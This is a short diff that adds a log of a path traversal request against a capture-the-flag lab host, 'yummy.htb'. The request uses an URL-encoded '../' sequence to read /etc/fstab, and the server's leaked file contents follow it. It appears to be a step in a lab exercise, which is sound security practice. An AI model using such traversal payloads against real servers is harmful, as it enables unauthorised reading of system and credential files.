@@ -1,0 +1,15 @@
+URL: http://yummy.htb:80/export/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Ffstab
+Response:
+# /etc/fstab: static file system information.
+#
+# Use 'blkid' to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
+/dev/disk/by-id/dm-uuid-LVM-kbY5CEbQYX49kUtzDyMAnUBqEcaIeuw6p6aZ3w4U8V7Yg0vKpVHhDQenLMNMUzLN / ext4 defaults 0 1
+# /boot was on /dev/sda2 during curtin installation
+/dev/disk/by-uuid/54423711-e90a-417e-8b68-fba775199f69 /boot ext4 defaults 0 1
+/dev/mapper/ubuntu--vg-swap	none	swap	sw	0	0
+proc /proc proc defaults,hidepid=2 0 0
